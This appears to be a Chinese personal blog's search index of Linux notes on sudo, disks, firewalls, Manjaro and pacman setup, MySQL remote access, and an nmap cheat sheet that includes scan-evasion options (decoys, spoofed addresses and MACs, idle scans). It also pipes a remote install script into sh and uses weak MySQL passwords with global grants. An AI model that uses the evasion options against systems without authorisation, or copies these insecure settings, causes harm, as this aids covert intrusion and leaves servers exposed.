与sudo su - xps su 命令与用户名之间有一个减号（-），这意味着完全切换到新的用户，即把环境变量信息也变更为新用户的相应信息，而不是保留原始的信息。强烈建议在切换用户身份时添加这个减号（-） 使用 sudo 命令把特定命令的执行权限赋予给指定用户(避免泄露 root 管理员密码) **sudo 服务中的可用参数以及作用** -h 列出帮助信息 -l 列出当前用户可执行的命 -u 用户名或 UID 值 以指定的用户身份执行命 -k 清空密码的有效时间，下 -b 在后台执行指定的命令 -p 更改询问密码的提示语 **sudo 命令具有如下功能：** ➢ 限制用户执行指定的命令： ➢ 记录用户执行的每一条命令； ➢ 配置文件（/etc/sudoers）提供集中的用户管理、权限与主机等参数； ➢ 验证密码的后 5 分钟内（默认值）无须再让用户再次验证密码。 使用 sudo 命令提供的 visudo 命令 来配置用户权限。这条命令在配置用户权限时将禁止多个用户同时修改 sudoers 配置文件，还 可以对配置文件内的参数进行语法检查，并在发现参数错误时进行报错。 (只有root才能使用visudo编辑所服务的配置文件) 在 sudo 命令的配置文件中，按照下 面的格式将第 99 行（大约）填写上指定的信息： 谁可以使用 允许使用的主机=(以谁的身份) 可执行命令的列表 xps ALL=(ALL) ALL 如果需要让某个用户只能使用 root 管理员的身份执行指定的命令，切记一定要给 出该命令的绝对路径，否则系统会识别不出来。 先使用 whereis 命令找出命令所对应 的保存路径，然后把配置文件第 99 行的用户权限参数修改成对应的路径即可 xps ALL=(ALL) /usr/bin/cat 加 NOPASSWD 参数，使得用户执行 sudo 命令时不再需要密码验证： xps ALL=NOPASSWD: /usr/sbin/poweroff ","date":"2019-05-05","objectID":"/%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E4%B8%8E%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/:0:0","tags":["用户身份","Linux，文件权限"],"title":"Linux用户身份与文件权限","uri":"/%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E4%B8%8E%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/"},{"categories":["Linux"],"content":"存储结构与磁盘划分 /boot 开机所需文件—内核、开机菜单以及所需配置文件等 /dev 以文件形式存放任何设备与接口 # /etc 配置文件 # /home 用户家目录 # /bin 存放单用户模式下还可以操作的命令 /lib 开机时用到的函数库，以及/bin 与/sbin 下面的命令要调用的函数 /sbin 开机过程中需要的命令 /media 用于挂载设备文件的目录 # /opt 放置第三方的软件 /root 系统管理员的家目录 # /srv 一些网络服务的数据文件目录 /tmp 任何人均可使用的“共享”临时目录 /proc 虚拟文件系统，例如系统内核、进程、外部设备及网络状态等 # /usr/local 用户自行安装的软件 # /usr/sbin Linux 系统开机时不会使用到的软件/命令/脚本 /usr/share 帮助与说明文件，也可放置共享文件 # /var 主要存放经常变化的文件，如日志 # /lost+found 当文件系统发生错误时，将一些丢失的文件片段存放在这里 常见的硬件设备及其文件名称 IDE 设备 /dev/hd[a-d] SCSI/SATA/U 盘 /dev/sd[a-p] 软驱 /dev/fd[0-1] 打印机 /dev/lp[0-15] 光驱 /dev/cdrom 鼠标 /dev/mouse 磁带机 /dev/st0 或/dev/ht0 系统采用 a～p 来代表 16 块不同的硬盘（默认从 a 开始分配），而且硬盘的分区编号也很有讲究： ➢ 主分区或扩展分区的编号从 1 开始，到 4 结束； ➢ 逻辑分区从编号 5 开始。 主分区不能超过 4 个 挂载硬件设备 mount 命令 用于挂载文件系统，格式为“mount 文件系统 挂载目录” mount 命令中的参数以及作用 -a 挂载所有在/etc/fstab 中定义的文件系统 ,执行后自动检查 /etc/fstab 文件中有无疏漏被挂载的设备文件，如果有，则进行自动挂载操作 -t 指定文件系统的类型 例如，要把设备/dev/sdb2 挂载到/backup 目录: mount /dev/sdb2 /backup # 重启后挂载就会失效 #永久配置 把挂载信息按照指定的填写格式 “设备文件 挂载目录 格式类型 权限选项 是否备份 是否自检” 写入到 /etc/fstab 文件中 #用于挂载信息的指定填写格式中，各字段所表示的意义 设备文件 一 般 为 设 备 的 路 径 + 设 备 名 称 ， 也 可 以 写 唯 一 识 别 码 （ UUID ，Universally Unique Identifier） 挂载目录 指定要挂载到的目录，需在挂载前创建好 格式类型 指定文件系统的格式，比如 Ext3、 Ext4、 XFS、 SWAP、 iso9660（此为光盘设备）等 权限选项 若设置为 defaults，则默认权限为： rw, suid, dev, exec, auto, nouser, async 是否备份 若为 1 则开机后使用 dump 进行磁盘备份，为 0 则不备份 是否自检 若为 1 则开机后自动进行磁盘自检，为 0 则不自检 #例如： 将文件系统为 ext4 的硬件设备/dev/sdb2 在开机后自动挂载到/backup 目录上，并保持默认权限且无需开机自检 vim /etc/fstab /dev/sdb2 /backup ext4 defaults 0 0 umount 命令 umount [挂载点/设备文件] umount /dev/sdb2 添加硬盘设备 #操作思路：首先需要在虚拟机中模拟添加入一块新的硬盘存储设备，然后再进行分区、格式化、挂载等操作，最后通过检查系统的挂载状态并真实地使用硬盘来验证硬盘设备是否成功添加 现在虚拟机中添加一个新的虚拟硬盘 fdisk 命令 \"fdisk [磁盘名称]\"，它提供了集添加、删除、转换分区等功能于一身的“一站式分区服务” 交互式 #fdisk 命令中的参数以及作用 m 查看全部可用的参数 n 添加新的分区 d 删除某个分区信息 l 列出所有可用的分区类型 t 改变某个分区的类型 p 查看分区信息 w 保存并退出 q 不保存直接退出 === 在确认创建一个主分区后，系统要求您先输入主分区的编号。我们在前文得知，主分区的编 号范围是 1～4，因此这里输入默认的 1 就可以了. 接下来系统会提示定义起始的扇区位置，这不 需要改动，我们敲击回车键保留默认设置即可，系统会自动计算出最靠前的空闲扇区的位置。最 后，系统会要求定义分区的结束扇区位置，这其实就是要去定义整个分区的大小是多少。我们不 用去计算扇区的个数，只需要输入+2G 即可创建出一个容量为 2GB 的硬盘分区 敲击参数 w 后回车，这样分区信息才是真正的写入成功啦 === 使用 file 命令查看该文件的属性, file /dev/sdb1 可以输入 partprobe 命令手动将分区信息同步到内核，而且一般推荐连续 两次执行该命令，效果会更好。如果使用这个命令都无法解决问题，那么就重启计算机吧 partprobe partprobe file /dev/sdb1 === mkfs 如果硬件存储设备没有进行格式化，则 Linux 系统无法得知怎么在其上写入数据。因此， 在对存储设备进行分区后还需要进行格式化操作。在 Linux 系统中用于格式化操作的命令是 mkfs。这条命令很有意思，因为在 Shell 终端中输入 mkfs 名后再敲击两下用于补齐命令的 Tab键 mkfs.文件类型名称 #例如: 要格式分区为 XFS 的文件系统 mkfs.xfs /dev/sdb1 === 挂载并使用存储设备 步骤： 首先是创建一个用于挂载设备的挂载点目录； 然后使用 mount 命 令将存储设备与挂载点进行关联； 最后使用 df -h 命令来查看挂载状态和硬盘使用量信息。 mkdir /newFS mount /dev/sdb1 /newFS/ df -h du 命令 查看文件数据占用量 格式为“du [选项] [文件]” du -sh /* 命令 来查看在 Linux 系统根目录下所有一级目录分别占用的空间大小 添加交换分区 为了解决真实物理内存不足的问题 , 通过在硬盘中预先划分一定的空间，然后将把内存中暂时不常用的数据临时存放到硬盘中，以便腾出物理内存空间让更活跃的程序服务来使用的技术 #交换分区的划分建议：在生产环境中，交换分区的 大小一般为真实物理内存的 1.5～2 倍，为了让大家更明显地感受交换分区空间的变化，这里 取出一个大小为 5GB 的主分区作为交换分区资源。在分区创建完毕后保存并退出即可： == SWAP 分区专用的格式化命令 mkswap mkswap /dev/sdb2 使用 swapon 命令把准备好的 SWAP 分区设备正式挂载到系统中。 swapon /dev/sdb5 free -m 查看交换分区的大小变化 vim /etc/fstab /dev/sdb2 swap swap defaults 0 0 磁盘容量配额 quota #介绍 quota -- 限制每个人能够使用的磁盘容量 inode 个数 isoft # 只是警告提醒，日志 ihard # 强制限制 block 容量 defaults xfs_uquota # xfs_uquota -x -c 'limit bsoft=3m bhard=6m isoft=3 ihard=6 xps' /boot edquota 修改配额 edquota xps 软硬方式链接 ln 命令 格式为“ln [选项] 目标 #参数 -s 创建“符号链接”（如果不带-s 参数，则默认创建硬链接） -f 强制创建文件或目录的链接 -i 覆盖前先询问 -v 显示创建链接的过程 #硬连接 -\u003e 源文件删除也没事 剖析ll文件参数信息 -rw-r--r--. 1 root root 813 Apr 15 2014 yum.conf . -\u003e facl + 1 多少块 813 占用实际大小 Apr 15 2014 最后修改文件的时间 ","date":"2019-05-05","objectID":"/rhel7%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E7%A3%81%E7%9B%98%E5%88%92%E5%88%86/:0:0","tags":["rhel","Linux"],"title":"Linux存储结构与磁盘划分","uri":"/rhel7%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E4%B8%8E%E7%A3%81%E7%9B%98%E5%88%92%E5%88%86/"},{"categories":["Linux"],"content":"iptables与firewall防火墙 配置网卡文件 修改配置文件 vim /etc/sysconfig/network-scripts/ifcfg-eno16777736 #文件内容如下 HWADDR=\"00:0C:29:C2:F1:76\" TYPE=\"Ethernet\" #类型 BOOTPROTO=\"dhcp\" DEFROUTE=\"yes\" PEERDNS=\"yes\" PEERROUTES=\"yes\" IPV4_FAILURE_FATAL=\"no\" IPV6INIT=\"yes\" IPV6_AUTOCONF=\"yes\" IPV6_DEFROUTE=\"yes\" IPV6_PEERDNS=\"yes\" IPV6_PEERROUTES=\"yes\" IPV6_FAILURE_FATAL=\"no\" NAME=\"eno16777736\" UUID=\"af3aaad5-b615-493c-872e-76503b9adad5\" #唯一标识 ONBOOT=\"yes\" #开机自启 基于图形界面配置网卡 nmtuio nmtuio systemctl restart network nm-connection-editor工具 nm-connection-editor 图形界面点击右上角 配置防火墙 规则： 自上而下做匹配 几种状态 accept 允许流量通过 reject 明确拒绝 drop 对方不知道你是否在线(显示超时) iptables 比较老,逐渐被取代 基于命令行 难度最高 iptables -L #显示所有的策略 iptables -F #清空所有策略 iptables -P INPUT DROP #默认禁止所有流量策略,不能reject -I #插入到最前面 -A #插入到最后面 -p # 允许的协议 --dport #本机端口 -s #来源 -j #本身为意义，后面跟动作 iptables -I INPUT -p icmp -j ACCEPT #只允许外部到内部的ping iptables -I INPUT -s 192.168.10.0/24 -p tcp --dport 22 #允许来自某个网段的访问，端口为22 -D #删除某一条 iptables -D INPUT 1 #删除第一条 iptables -I INPUT -p tcp --port 22 -j REJECT #禁止外部所有22端口的流量 iptables -I INPUT -p tcp --port 22:200 -j REJECT #禁止外部所有20到200端口的流量 service iptables save firewalld 防火墙(分为下面两个) zone 区域 sbit 安全位 public 默认策略,当前使用 firewall-cmd 命令行 Runtime 当前生效，重启后失效 Premanent 当前暂时不生效，但是永久生效 --premanent # 建议添加这个 firewall-cmd -reload #重启 firewall-cmd --get-default-zone #查看当前区域 firewall-cmd --set-default-zone=drop #切换默认区域到丢包 firewall-cmd --permanent --zone=drop --change-interface=en0167777 #重启之后，把这个网卡区域换为drop firewall-cmd --permanent get-zone-of-interface=en0167777 #重启之后，查看 紧急模式 firewall-cmd --panic-on #切断所有网络连接，包括ping的数据包 firewall-cmd --panic-off #关闭紧急模式 查询服务 firewall-cmd --zone=public --query-service=http #查看是否允许http firewall-cmd --zone=public --query-service=ssh 添加允许服务 firewall-cmd --zone=public --add-servcice=http #允许从外访问http服务 firewall-cmd --zone=public --add-servcice=https #重启才可以 firewall-cmd --reload firewall-cmd --zone=public --add-servcice=https 禁止服务 firewall-cmd --zone=public --remove-servcice=https firewall-cmd --permanent --zone=public --add-servcice=https firewall-cmd --permanent --zone=public --query-servcice=https 添加端口号 firewall-cmd --zone=public --add-port=8080/tcp #把这个端口添加到ctp协议组，允许 firewall-cmd --zone=public --add-port=80-90/tcp #端口端 端口转发（隐藏原始端口） firewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #转发888到22 firewall-cmd --reload 富规则（复规则） 精准匹配 firewall-cmd --permanent --zone=public --add-rich-rule=\"rule family\"=\"ipv4\" source address=\"192.168.10.0/24\" service name=\"ssh\" reject\" firewall-cmd reload firewall-config 图形化 firewall-config TCP Wrappers （优先级：先匹配允许，再匹配拒绝） /etc/hosts.allow #白名单 允许服务名称、IP地址 /etc/hosts.deny #黑名单 拒绝服务名称、IP地址 白名单(编辑后就生效) sshd:192.168.10.0/24 #允许这个网段的主机访问 黑名单(编辑后就生效) sshd:192.168.10.* # 所有主机，通配符 1.2.3. 数据链路层（协议，端口号，来访IP地址） 4. 应用层（服务名称） 四个工具，只要有一个把他禁止，就禁止了！ ","date":"2019-05-05","objectID":"/iptables%E4%B8%8Efirewall%E9%98%B2%E7%81%AB%E5%A2%99/:0:0","tags":["防火墙","Linux","rhel"],"title":"iptables与firewall","uri":"/iptables%E4%B8%8Efirewall%E9%98%B2%E7%81%AB%E5%A2%99/"},{"categories":["Linux"],"content":"Manjaro 安装之后 基本配置 配置国内源 sudo pacman-mirrors -i -c China -m rank #弹出来框，我选择的清华的源 升级系统 sudo pacman -Syy \u0026\u0026 sudo pacam -Syyu 安装vim sudo pacman -S vim 添加arch源 sudo vim /etc/pacman.conf #在文件末尾添加，我添加的清华的 安装archlinuxcn签名钥匙(导入 GPG key，否则的话key验证失败会导致无法安装软件) sudo pacman -Syy \u0026\u0026 sudo pacman -S archlinuxcn-keyring 安装网络工具包，ifconfig等 pacman -S net-tools dnsutils inetutils iproute2 安装sogou拼音输入法 sudo pacman -S fcitx-im # 安装fcitx 选择全部安装 sudo pacman -S fcitx-configtool # fcitx 配置界面 sudo pacman -S fcitx-sogoupinyin # 安装sogoupinyin 设置中文输入法环境变量，编辑~/.xprofile文件，增加下面几行(如果文件不存在，则新建) 重启后生效 sudo vim ~/.xprofile # 打开编辑.xprofile文件 # 在文件中加入以下两行代码 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" 安装Google-Chrome浏览器 sudo pacman -S google-chrome 安装网易云音乐 sudo pacman -S netease-cloud-music 安装git (默认貌似就已经存在了) sudo pacman -S git 安装wps，及其字体 $ sudo pacman -S wps-office # 安装wps $ sudo pacman -S ttf-wps-fonts # 安装wps字体 配置wps，使wps可以输入中文 $ sudo vim /usr/bin/wps # 编辑wps配置文件 # 在 紧跟#!/bin/bash后添加下列三行 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" 注销后再次登录输入法生效。 安装Shadowsocks-qt5，实现科学上网（我还是一会安ssr吧，在文章最底下） sudo pacman -S shadowsocks-qt5 安装VSCode sudo pacman -S visual-studio-code-bin # 安装VSCode和云音乐等等，都需archlinuxcn源 安装markdown编辑器 sudo pacman -S typora 配置jdk环境变量 # 配置环境变量 # sudo vim /etc/profile #编辑文件 # 在文件末尾处追加下列几行 export JAVA_HOME=你的jdk解压后的绝对路径 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 安装终端显示信息neofetch(装b神器,安装screenfetch也可) sudo pacman -S neofetch 安装Tim,微信 (KDE桌面无法使用) sudo pacman -S deepin.com.qq.office deepin.com.wechat 配置微信，tim的中文输入问题 (KDE桌面无法使用) Tim启动脚本位置：/opt/deepinwine/apps/Deepin-TIM/run.sh WeChat启动脚本位置：/opt/deepinwine/apps/Deepin-WeChat/run.sh # 1 配置tim中文，打开tim启动脚本文件 （微信同理） sudo vim /opt/deepinwine/apps/Deepin-TIM/run.sh 在启动脚本命令之前添加以下内容 export GTK_IM_MODULE=fcitx export QT_IM_MODULE=fcitx export XMODIFIERS=\"@im=fcitx\" 安装Deepin Terminal(终端)，安装完成之后，自行在deepin-terminal更改显示字体 sudo pacman -S deepin-terminal 安装有道词典 sudo pacman -S youdao-dict 安装vokoscreen录屏 sudo pacman -S vokoscreen 安装MariaDb代替mysql(MyriaDb与Mysql相互兼容) $ sudo pacman -S mariadb mariadb-clients # 安装成功后，根据提示，输入下列指令初始化MariaDb数据库 $ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql # 一番信息自动输出完成后，执行以下代码 $ sudo systemctl start mysqld # 启动MariaDb $ mysqladmin -u root password \"root\" # 为root、用户添加密码 $ sudo systemctl enable mysqld # 设置mariaDb开机自启 $ mysql -uroot -p # 输入设置的的密码，登录数据库 安装配置oh my zsh(听说是bash的升级版，装*专用，我就先不弄了) $ sudo pacman -S zsh $ sh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" # 下载并配置ohmyzsh $ chsh -s /bin/zsh #更换默认bash，重启后生效 卸载Manjaro自带的一些没用的软件 卸载之后就可以更新一下软件了 sudo pacman -Syyu ","date":"2019-05-05","objectID":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/:0:0","tags":["Manjaro","Linux"],"title":"Manjaro 安装之后 基本配置","uri":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"},{"categories":["Linux"],"content":"pacman基本命令 更新软件 sudo pacman -Su # 更新已安装软件 sudo pacman -Syu #更新软件前检查包列表是否最新 sudo pacman -Syyu #更新前强制下载包列表 查找软件 sudo pacman -Ss packge_name 安装指定的包 pacman -S package_name1 package_name2 ... 安装包组 一些包属于一个可以同时安装的软件包组，例如： pacman -S gnome 想要查看哪些包属于 gnome 组，运行： pacman -Sg gnome 删除软件包 1.删除单个软件包，保留其全部已经安装的依赖关系 pacman -R package_name 2.除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系： pacman -Rs package_name 3.要删除软件包和所有依赖这个软件包的程序 pacman -Rns package_name 4.要删除软件包，但是不删除依赖这个软件包的其他程序： pacman -Rdd package_name 5.pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件： pacman -Rn package_name1 ​ 注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。 清理软件包缓存 pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。 使用内建选项即可清除未安装软件包的缓存： pacman -Sc 警告:仅在确定当前安装的软件包足够稳定且不需要降级时才执行清理。 pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文)中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。 更新源 自动： 自动设置最快的源 sudo pacman-mirrors -g sudo pacman -Syyu 手动： 选择源：sudo pacman-mirrors -i 同样要强制更新包 重置为自动选择： sudo pacman-mirrors -g -c all 切换testing分支 sudo pacman-mirrors -g -b testing sudo pacman -Syyu 退回稳定版 sudo pacman-mirrors -g -b stable sudo pacman -Syyuu sudo pacman-mirrors -i -c China -m rank ","date":"2019-05-05","objectID":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/:1:0","tags":["Manjaro","Linux"],"title":"Manjaro 安装之后 基本配置","uri":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"},{"categories":["Linux"],"content":"清理垃圾 清除系统中无用的包 sudo pacman -R $(pacman -Qdtq) 清除已下载的安装包 sudo pacman -Scc 日志垃圾 查看日志文件 du -t 100M /var 或 journalctl --disk-usage 删除指定大小日志文件 sudo journalctl --vacuum-size=50M ","date":"2019-05-05","objectID":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/:1:1","tags":["Manjaro","Linux"],"title":"Manjaro 安装之后 基本配置","uri":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"},{"categories":["Linux"],"content":"安装ssr 步骤： 安装git命令，用 git clone -b manyuser https://github.com/shadowsocksrr/shadowsocksr.git 下载shadowsockssr。 进入shadowshocksr目录 运行如下命令： ./initcfg.sh 运行如下命令编写user-config.json配置文件 sudo nano user-config.json 将ssr服务器的配置填写到配置文件中 进入shadowsocks目录 cd shadowsocks ./local.py 代理客户端已经开始运行 设置浏览器代理： 以firefox为例， 从 https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?src=search 添加foxyproxy-standard插件 左键点击插件图标 选 “options” – “add” – “socks5” 填写代理的名称（随便写），IP（127.0.0.1），端口（1080） ","date":"2019-05-05","objectID":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/:1:2","tags":["Manjaro","Linux"],"title":"Manjaro 安装之后 基本配置","uri":"/manjaro-%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E-%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"},{"categories":["渗透测试"],"content":"新学一个抓包工具 -\u003e tcpump tcpdmp -i eth0 -nn host 192.168.1.56 port 22 # 用nc连 nc 192.168.1.56 -t 22 # 点. 就是ack的意思 ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:0:1","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"主机发现 -iL # 指定文件 -iR 100 -p22 # 随机选择目标100个 的22端口 nmap 192.168.0.0/24 --exclude 192.168.0.1-100 # 不扫描后面的部分 -sL # 列出ip（相当于子网掩码的计算） -sN # 只ping -Pn #不做ping扫描，例如针对防火墙等安全产品， 防止：如果没有回包就不进行了 -PS/PA/PU/PY # 用syn，ack，udp， sctp 发现 -PE/PP/PM # 用echo， 时间戳，子网掩码 （一般没啥结果） -PO # ip协议的ping -n/ -R # 不做dns解析 / 做反向的解析 --dns-servers # 调用指定的dns服务器 --system-dns # 操作系统默认的dns，一般不用 --traceroute # 过程中进行raceroute ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:1:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"端口发现 -sS/sT/sA/sW/sM # 默认的 syn扫描/tcp扫描,建立完整连接(最准确)/发送ack / 窗口扫描 / ack+fn -sU # udp扫描（准确性不怎么高） -sN/sF/sX # tcp的flag全为空 /只有fin/ fin,psh,urg --scanflag # 自定义flag （自己得懂原理） -sI # 僵尸扫描 -sY/sZ # sctp用 -sO # ip扫描 -b # ip中继 - -p # 指定端口(tcp与udp都扫), U: 53 -T:21 (分别指定tcp与udp的端口) 默认1000个 --exclude-ports # 指定端口中某一段 -F # 快速扫描(不会扫描100个全部端口) -r # 连续扫描(顺序) --top-ports # 扫排名前10个 --port-radio # 扫描更常见的端口(用处不大) ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:2:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"服务扫描 -sV # 扫描这个端口跑的什么服务 --version-intensity # 0-9的扫描程度，9最详细 --version-light # 上面的等于2时 --version-all # 上面的等于9时 --version-trace # 将扫描过程进行跟踪 ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:3:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"脚本扫描 （脚本目录:/usr/share/nmap/scripts/） -sC # 默认 --script=... # 指定脚本 --script-args= # 带参数 --script-args-file= --script-trace # 也可以trace --script-updatedb # 更新脚本 nmap --script-updatedb --script-help # 查看脚本的帮助 ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:4:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"操作系统类型 -O # 操作系统类型 --osscan-limit # 限制检测的系统类型 --osscan-guess ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:5:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"时间和性能 -T # 指定间隔时间 -min-hostgroup/ -max-hostgroup # 最少一次扫描的主机数量 组 --min-parallelism/ --max-parallelism # 最少一次扫描的主机数量 --min-rtt-timeout/ --max-rtt-timeout/ --initial-rtt-timeout # 最小最大rtt --max-retries # --host-timeout # 超时时间 --scan-delay/ --max-scan-delay 10s # 延时时间(防止被发现) --min-rate # 发包最小速率 --max-rate ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:6:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"防火墙 和躲避 -f # 最大传输mtu值 1500啥的 -D 192.168.0.2 192.168.0.3 192.168.0.4 # 伪造原地址(迷惑) -S # 伪造源地址 -e # 指定网卡 -g # 指定使用的源端口 --proxies \u003curl1, [url2]\u003e # 置地广代理服务器替我们发包 --data # 数据字段指定内容(必须是16进制) --data-string --data-length --ip-options --ttl --spoof-mac # 欺骗mac地址 --badsum # 发错的差错校验值 ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:7:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"输出格式 -oN / -oX / -oS /-oG # 正常格式/xml格式/../../ ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:8:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["渗透测试"],"content":"杂项 -6 # ipv6的 -A # 几个参数的组合（涵盖：-v, -O, --script, --trace） # trace路由追踪 ","date":"2019-04-21","objectID":"/nmap%E5%8F%82%E6%95%B0/:9:0","tags":["nmap","安全","渗透测试"],"title":"nmap参数简介","uri":"/nmap%E5%8F%82%E6%95%B0/"},{"categories":["数据库"],"content":"远程连接MySQL 想要远程连接MySQL 那么必须是普通用户才行 不能是 root 用户 所以我们要先创建一个普通用户 创建普通用户 CREATE USER 'username'@'%' IDENTIFIED BY 'password'; 给普通用户赋权 GRANT ALL ON *.* TO 'username'@'%' 刷新系统权限相关表 FLUSH PRIVILEGES 以上三步执行的 创建用户 –\u003e 给创建的用户赋权 –\u003e 刷新 这样的话 可能还是不能完成MySQL的一个远程连接 这时候需要改变MySQL的一个默认配置 这配置文件位于/etc/mysql/mysql.conf.d/下的mysqld.cnf 里面有找到bind-address 把值127.0.0.1改为0.0.0.0然后接下来就是远程连接了 改完要记得重启MySQL服务 接下来就是远程连接MySQL首先要保证自己电脑装了MySQL才能远程连接 mysql -u username -p password -h ip地址 -P 端口号（一般默认是3306） 如果想要远程连接 首先要保证 本地安装了MySQL 才能远程连接 ","date":"2019-03-04","objectID":"/%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5mysql/:0:0","tags":["mysql，数据库"],"title":"远程连接mysql","uri":"/%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5mysql/"},{"categories":["数据库"],"content":"1、使用root用户登录mysql 2、添加具有本地(localhost/127.0.0.1)访问权限的用户 create user 'newuser'@'localhost' identified by 'password'; 3、创建具有远程访问权限的用户 create user 'newuser'@'%' identified by 'password'; 创建之后记得执行下面指令更新权限： flush privileges; 3、为新用户分配本地权限，可以指定数据库dbname和表名，可以用*替指所有。 grant all privileges on `dbname`.* to 'newuser'@'localhost' identified by 'password'; 4、为新用户分配远程权限，可以指定数据库dbname和表名，可以用*替指所有。 grant all privileges on `dbname`.* to 'newuser'@'%' identified by 'password'; 分配所有权限 \u003e grant all privileges on *.* to 'test'@'%' identified by '123456' 分配好之后之后记得执行下面指令更新权限： flush privileges; 5、如果还有问题，可以使用root账号登陆上去查询一下，再看看有没问题。 use mysql 6、查看user表 select Host, User, Password from user; ","date":"2019-03-02","objectID":"/mysql%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E4%B8%BA%E6%96%B0%E7%94%A8%E6%88%B7%E5%88%86%E9%85%8D%E6%9D%83%E9%99%90/:0:0","tags":["mysql","数据库"],"title":"mysql创建新用户并分配权限","uri":"/mysql%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E4%B8%BA%E6%96%B0%E7%94%A8%E6%88%B7%E5%88%86%E9%85%8D%E6%9D%83%E9%99%90/"},{"categories":["数据库"],"content":"﻿复制结构：仿照student表结构复制一张new_student表,新表是空的： create table new_student like student; 复制数据：但是没主键，结构不重要： create table new_student2 as ( select * from student ); 复制表结构与数据，一模一样： insert into new_student3 select * from student; ","date":"2019-03-02","objectID":"/mysql-%E8%A1%A8%E7%BB%93%E6%9E%84%E7%9A%84%E5%A4%8D%E5%88%B6/:0:0","tags":["mysql，数据库"],"title":"mysql表结构复制","uri":"/mysql-%E8%A1%A8%E7%BB%93%E6%9E%84%E7%9A%84%E5%A4%8D%E5%88%B6/"},{"categories":["数据库"],"content":"首先删除mysql: sudo apt-get remove mysql-* 然后清理残留的数据 dpkg -l |grep ^rc|awk '{print $2}' |sudo xargs dpkg -P 它会跳出一个对话框，你选择yes就好了 然后安装mysql sudo apt-get install mysql-client mysql-server 安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的 检查mysql是不是在运行 sudo service mysql status 